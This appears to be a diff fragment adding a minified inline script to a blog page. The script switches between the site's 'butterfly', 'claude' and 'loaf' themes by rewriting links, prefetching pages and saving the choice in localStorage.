+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="loaf",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
